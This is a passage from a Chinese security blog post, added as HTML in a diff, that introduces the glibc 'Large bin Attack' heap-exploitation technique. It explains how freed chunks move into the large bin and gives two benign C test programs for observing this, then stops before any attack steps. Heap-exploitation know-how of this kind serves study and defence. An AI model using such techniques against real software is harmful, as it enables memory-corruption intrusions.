@@ -1,0 +1,1440 @@
+<!DOCTYPE html>
+<html
+  lang="zh"
+  dir="ltr"
+  class="dark"
+  
+><head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  .dark{
+    transition: 1.5s;
+  }
+  .light{
+      transition: 1.5s;
+  }
+     
+body::-webkit-scrollbar {
+    width: 12px;    
+     
+}
+body::-webkit-scrollbar-thumb {
+    border-radius: 4px;
+    -webkit-box-shadow: inset 0 0 5px rgba(194, 192, 192, 0.2);
+    background: rgba(99, 99, 99, 0.2);
+    transition: 0.5s;
+}
+body::-webkit-scrollbar-track {
+    border-radius: 0;
+    background: transparent;
+
+}
+body::-webkit-scrollbar-thumb:hover {
+    background: rgba(0, 0, 0, 0.2);
+}
+
+.dark body::-webkit-scrollbar-thumb{
+    -webkit-box-shadow: inset 0 0 5px rgba(134, 127, 127, 0.2);
+    background: rgba(194, 182, 182, 0.2);
+}
+.dark body::-webkit-scrollbar-thumb:hover{
+    background: rgba(255, 255, 255, 0.2);
+}
+</style>
+
+
+<title>Largebin_Attack - P3troL1er 的个人博客</title>
+
+
+<meta name="generator" content="Hugo Eureka 0.9.3" />
+<link rel="stylesheet" href="https://peterliuzhi.top/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css">
+<script defer src="https://peterliuzhi.top/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload"
+  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&amp;family=Noto&#43;Serif&#43;SC:wght@400;600;700&amp;display=swap"
+  as="style" onload="this.onload=null;this.rel='stylesheet'">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css"
+   media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js"
+   crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/python.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/bash.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/c.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/cpp.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/armasm.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/x86asm.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/mipsasm.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/vim.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/java.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/javascript.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/typescript.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/go.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/php.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/css.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/powershell.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/shell.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/markdown.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/json.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/yaml.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/xml.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/sql.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/cmake.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/makefile.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/matlab.min.js"
+     crossorigin></script>
+<link rel="stylesheet" href="https://peterliuzhi.top/css/highlightjs.min.0e3b6ac4177cdecae52d1b2de76aa7a0ce8a92e4cc23ef2f8691f0218a25f5d328e14bf47be023009535efe940980954.css" media="print" onload="this.media='all';this.onload=null">
+
+
+
+<script src="https://peterliuzhi.top/js/99649a0b4d.js" crossorigin="anonymous"></script>
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css"
+   integrity="sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ"  media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js" 
+  integrity="sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY"  crossorigin></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js"
+   integrity="sha384-&#43;XBljXPPiv&#43;OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR"  crossorigin></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\[", right: "\\]", display: true }
+      ],
+    });
+  });
+</script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js" 
+  integrity="sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0"  crossorigin></script>
+<link rel="preconnect" href="https://www.google-analytics.com" crossorigin>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-C6MXT4N6J6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-C6MXT4N6J6');
+</script>
+
+
+
+<script src="https://peterliuzhi.top/js/jquery.min.js"></script>
+<link rel="stylesheet" href="https://peterliuzhi.top/css/jquery.fancybox.min.css" />
+<script src="https://peterliuzhi.top/js/jquery.fancybox.min.js"></script>
+
+
+  
+<script language="javascript">
+    function setClipboardText(event) {
+        event.preventDefault();
+        var node = document.createElement('div');
+        
+        node.appendChild(window.getSelection().getRangeAt(0).cloneContents());
+        
+        var htmlData =
+            "<div>" +
+            node.innerHTML +
+            "<br /><br />著作权归作者P3troL1er所有。<br />" +
+            "商业转载请联系作者P3troL1er获得授权，非商业转载请注明出处。<br />" +
+            '作者：P3troL1er<br />链接：<a href="https://peterliuzhi.top/">https://peterliuzhi.top/</a><br />' +
+            "</div>";
+        var textData = ""
+        if (window.getSelection().anchorNode.parentElement.className == "highlight")
+            textData =
+                window.getSelection().getRangeAt(0)
+        else
+            textData =
+                window.getSelection().getRangeAt(0) +
+                "\n\n著作权归作者所有。\n" +
+                "商业转载请联系作者获得授权，非商业转载请注明出处。\n" +
+                "作者：P3troL1er\n链接：https://peterliuzhi.top/\n";
+        if (event.clipboardData) {
+            event.clipboardData.setData("text/html", htmlData);
+            
+            event.clipboardData.setData("text/plain", textData);
+        } else if (window.clipboardData) {
+            
+            return window.clipboardData.setData("text", textData);
+        }
+    }
+    document.addEventListener("copy", function (e) {
+        setClipboardText(e);
+    });
+</script>
+
+<link rel="icon" type="image/png" sizes="32x32" href="https://peterliuzhi.top/images/letterP_hu69a934028f2e96ea6829f890fa9740ec_16107_32x32_fill_box_center_3.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://peterliuzhi.top/images/letterP_hu69a934028f2e96ea6829f890fa9740ec_16107_180x180_fill_box_center_3.png">
+
+
+<meta name="description"
+  content="基本的Large bin Attack攻击手法">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+      "@type": "ListItem",
+      "position": 1 ,
+      "name":"Principles",
+      "item":"https://peterliuzhi.top/principle/"},{
+      "@type": "ListItem",
+      "position": 2 ,
+      "name":"Largebin_Attack",
+      "item":"https://peterliuzhi.top/principle/largebin_attack/"}]
+}
+</script>
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://peterliuzhi.top/principle/largebin_attack/"
+    },
+    "headline": "Largebin_Attack - P3troL1er 的个人博客","datePublished": "2023-02-20T22:30:15+08:00",
+    "dateModified": "2023-02-20T22:46:37+08:00",
+    "wordCount":  5397 ,
+    "publisher": {
+        "@type": "Person",
+        "name": "Peter Liu",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://peterliuzhi.top/images/letterP.png"
+        }
+        },
+    "description": "基本的Large bin Attack攻击手法"
+}
+</script><meta property="og:title" content="Largebin_Attack - P3troL1er 的个人博客" />
+<meta property="og:type" content="article" />
+
+
+<meta property="og:image" content="https://peterliuzhi.top/images/letterP.png">
+
+
+<meta property="og:url" content="https://peterliuzhi.top/principle/largebin_attack/" />
+
+
+
+<meta property="og:description" content="基本的Large bin Attack攻击手法" />
+
+
+
+<meta property="og:locale" content="zh" />
+
+
+
+
+<meta property="og:site_name" content="P3troL1er 的个人博客" />
+
+
+
+
+
+
+<meta property="article:published_time" content="2023-02-20T22:30:15&#43;08:00" />
+
+
+<meta property="article:modified_time" content="2023-02-20T22:46:37&#43;08:00" />
+
+
+
+<meta property="article:section" content="principle" />
+
+
+<meta property="article:tag" content="pwn" />
+
+<meta property="article:tag" content="largebin" />
+
+<meta property="article:tag" content="heap" />
+
+
+
+
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/sictf-pwn-writeup/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/tricks/linux%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%88%86%E6%9E%90%E6%96%87%E4%BB%B6%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/hgame-week2-pwn-writeup/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/hgame-week1-pwn-writeup/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/tricks/pwntools%E8%B0%83%E7%94%A8gdb%E8%B0%83%E8%AF%95%E6%97%B6%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8binsheap%E7%AD%89%E5%91%BD%E4%BB%A4/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/0ctf_2017_babyheap/" />
+
+
+
+</head>
+
+
+  <body class="flex min-h-screen flex-col">
+    <header
+      class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"
+    >
+      <div class="mx-auto w-full max-w-screen-xl"><style>
+.search-container {
+  margin-top: -0.3rem;
+  margin-right: 1rem;
+}
+.search-container .search {
+  border: 1px solid #e2e8f0;
+  border-radius: 4px;
+}
+.search-container input {
+  padding-left: 1rem;
+  line-height: 2rem;
+  outline: none;
+  background: transparent;
+}
+.search-container button {
+  font-size: 0.8rem;
+  margin-right: 0.5rem;
+  color: #e2e8f0;
+}
+</style>
+<script>
+    let storageColorScheme = localStorage.getItem("lightDarkMode")
+    if ((storageColorScheme == 'Auto' && window.matchMedia("(prefers-color-scheme: light)").matches) || storageColorScheme == "Light") {
+        document.getElementsByTagName('html')[0].classList.remove('dark')
+    }
+</script>
+<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
+    <a href="/" class="me-6 text-primary-text text-xl font-bold">P3troL1er 的个人博客</a>
+    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+        <i class="fas fa-bars"></i>
+    </button>
+    <div id="target"
+        class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
+        <div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0">
+            <a href="/#about" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">About</a>
+            <a href="/posts/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Posts</a>
+            <a href="/writeup/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">WriteUp</a>
+            <a href="/tricks/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Tricks</a>
+            <a href="/principle/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  me-4">Principle</a>
+            <a href="/archive/archive/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Archive</a>
+            <a href="/stats/stats/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Statistics</a>
+            <a href="/friend/links/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Friends</a>
+        </div>
+    <style>
+	.ld {
+		
+	}
+    .ld:hover{
+        animation: yaolingdang 4s infinite ease;
+    }
+	@keyframes yaolingdang {
+		5%,25%,45% {
+			transform: rotate(8deg);
+		}
+		0%,10%,30%,50% {
+			transform: rotate(-8deg);
+		}
+		15%,35%,55% {
+			transform: rotate(4deg);
+		}
+		20%,40%,60% {
+			transform: rotate(-4deg);
+		}
+		65%,100% {
+			transform: rotate(0deg);
+		}
+	}
+    </style>
+        <div class="flex" style="margin-right: 20px; margin-left: 20px;">
+                <div class="mx-2 mb-2 mt-4 md:mx-0 md:mt-2">
+                    <a href="/subscribe/"><i class="fa-regular fa-bell ld"></i></a>
+                </div>
+        </div>
+        <div class="flex">
+            <div class="search-container relative pt-4 md:pt-0">
+                <div class="search">
+                    <form role="search" class="search-form" action="/search.html" method="get">
+                    <label>
+                        <input name="q" type="text" placeholder="搜索 ..." class="search-field">
+                    </label>
+                    <button>
+                        <i class="fa-solid fa-magnifying-glass"></i>
+                    </button>
+                    </form>
+                </div>
+            </div>
+        <div class="flex">
+            <div class="relative pt-4 md:pt-0">
+                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
+                    <i class="fas fa-moon"></i>
+                </div>
+                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
+                </div>
+                <div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
+                    id='lightDarkOptions'>
+                    <span class="px-4 py-1 hover:text-eureka" name="Light">浅色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Dark">深色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Auto">自动</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
+    </div>
+
+</nav>
+<script>
+    
+    let element = document.getElementById('lightDarkMode')
+    if (storageColorScheme == 'Auto') {
+        element.firstElementChild.classList.remove('fa-moon')
+        element.firstElementChild.setAttribute("data-icon", 'adjust')
+        element.firstElementChild.classList.add('fa-adjust')
+        document.addEventListener('DOMContentLoaded', () => {
+            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
+        })
+    } else if (storageColorScheme == "Light") {
+        element.firstElementChild.classList.remove('fa-moon')
+        element.firstElementChild.setAttribute("data-icon", 'sun')
+        element.firstElementChild.classList.add('fa-sun')
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        getcolorscheme();
+        switchBurger();
+    });
+</script>
+</div>
+    </header>
+    <main class="grow pt-16">
+        <div class="pl-scrollbar">
+          <div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8">
+  
+  
+  <div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12">
+    <div
+      class=" bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"
+    >
+      <article class="prose">
+  <h1 class="mb-4">Largebin_Attack</h1>
+
+  <div
+  class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"
+>
+  <div class="me-6 my-2">
+    <i class="fas fa-calendar me-1"></i>
+    <span
+      >Monday, February 20, 2023</span
+    >
+  </div>
+  <div class="me-6 my-2">
+    <i class="fa-solid fa-file-pen"></i>
+    <span>本文共5397字</span>
+  </div>
+
+  <div class="me-6 my-2">
+    <i class="fas fa-clock me-1"></i>
+    <span>11分钟阅读时长</span>
+  </div>
+
+  
+    <div class="me-6 my-2">
+      <i class="fas fa-folder me-1"></i>
+      
+        <a href="https://peterliuzhi.top/categories/principle/" class="hover:text-eureka"
+          >principle</a
+        >
+      
+    </div>
+  
+
+    
+    <div class="me-6 my-2">
+      <i class="fa-solid fa-tag"></i>
+      
+        <a href="https://peterliuzhi.top/tags/pwn/" class="hover:text-eureka"
+          >pwn</a
+        >
+      
+        
+          <span>, </span>
+        <a href="https://peterliuzhi.top/tags/largebin/" class="hover:text-eureka"
+          >largebin</a
+        >
+      
+        
+          <span>, </span>
+        <a href="https://peterliuzhi.top/tags/heap/" class="hover:text-eureka"
+          >heap</a
+        >
+      
+    </div>
+  
+
+  
+  <div class="mx-2 mb-2 mt-4 md:mx-0 md:mt-2">
+        <a href="/subscribe/"><i class="fa-solid fa-bell"></i>&nbsp;订阅</a>
+      </div>
+</div>
+
+
+  
+  
+  
+  <b><p>⚠️本文是<a href="https://github.com/PeterLiu-all">作者P3troL1er</a>原创，首发于<a href="https://peterliuzhi.top/principle/largebin_attack/">https://peterliuzhi.top/</a>。商业转载请联系作者获得授权，非商业转载请注明出处！</p></b>
+
+  <blockquote>
+<p>When you begin to touch your heart or let your heart be touched, you begin to discover that it&rsquo;s bottomless.
+— <cite>Pema Chödrön</cite></p>
+</blockquote>
+<h1 id="large-bin的数据结构">Large bin的数据结构</h1>
+<h2 id="何时会进入large-bin中">何时会进入large bin中？</h2>
+<p>Large bin用来储存释放掉的大chunk。</p>
+<ol>
+<li>当释放一个大chunk的时候，会先进入unsorted bin。</li>
+<li>当程序开始从unsorted bin中查找chunk的时候
+<ol>
+<li>如果查找到的chunk的大小不等于要申请的chunk的大小（chunk size != nb），就判定为不符合条件的chunk，根据它的大小将其放进small bin或者large bin中。</li>
+<li>如果查找到的chunk的大小等于要申请的chunk的大小（chunk size == nb），就判定为符合条件的chunk，直接停止查找，将其从unsorted bin中取出返回</li>
+</ol>
+</li>
+<li>如果到unsorted bin为空都没有找到符合条件的chunk，那么就从small bin或者large bin中寻找可以分割的或者大小刚好的chunk</li>
+</ol>
+<p>也就是说，如果要分割chunk，会将他们先放进small bin或者large bin中再分割，再把剩余部分放进unsorted bin中：</p>
+<p>
+        <a data-fancybox="gallery" href="/image/img_v2_3a9f2664-fc97-4a6d-8a0b-a65d6295693g.png">
+            <img class="mx-auto" alt="" src="/image/img_v2_3a9f2664-fc97-4a6d-8a0b-a65d6295693g.png" />
+        </a>
+    </p>
+<h3 id="测试程序1">测试程序1</h3>
+<p>调试以下程序可以发现，glibc在查找到一个可以分割的chunk的时候不会退出查找：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">p1</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">2048</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">p2</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">3072</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">p3</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">2048</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">p4</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">2048</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p1</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>当free完这些大chunk的时候，他们都在unsorted bin中</p>
+<p>
+        <a data-fancybox="gallery" href="/image/Pasted%20image%2020230220001936.png">
+            <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230220001936.png" />
+        </a>
+    </p>
+<p>
+        <a data-fancybox="gallery" href="/image/Pasted%20image%2020230220002104.png">
+            <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230220002104.png" />
+        </a>
+    </p>
+<p>但是当malloc(3000)的时候，他们都进入了unsorted bin中，然后其中一个被取出分割后放回了unsorted bin中</p>
+<p>
+        <a data-fancybox="gallery" href="/image/Pasted%20image%2020230220002252.png">
+            <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230220002252.png" />
+        </a>
+    </p>
+<h3 id="调试程序2">调试程序2</h3>
+<p>调试以下程序可以发现，程序在遇到大小刚刚好的chunk的时候会直接退出查找，同时也印证了可以分割的chunk会先进入large bin或small bin：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">p1</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">2048</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">p2</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">2048</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">p3</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">3072</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">p4</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">2048</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">p5</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">3072</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">p6</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">p7</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">2048</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p1</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>在malloc(3000)前：</p>
+<p>
+        <a data-fancybox="gallery" href="/image/Pasted%20image%2020230220210927.png">
+            <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230220210927.png" />
+        </a>
+    </p>
+<p>之后：</p>
+<p>
+        <a data-fancybox="gallery" href="/image/Pasted%20image%2020230220211927.png">
+            <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230220211927.png" />
+        </a>
+    </p>
+<p>
+        <a data-fancybox="gallery" href="/image/Pasted%20image%2020230220211951.png">
+            <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230220211951.png" />
+        </a>
+    </p>
+<p>
+        <a data-fancybox="gallery" href="/image/Pasted%20image%2020230220212020.png">
+            <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230220212020.png" />
+        </a>
+    </p>
+<p>
+        <a data-fancybox="gallery" href="/image/Pasted%20image%2020230220212041.png">
+            <img class="mx-auto" alt="" src="/image/Pasted%20image%2020230220212041.png" />
+        </a>
+    </p>
+<h2 id="large-bin的结构">large bin的结构？</h2>
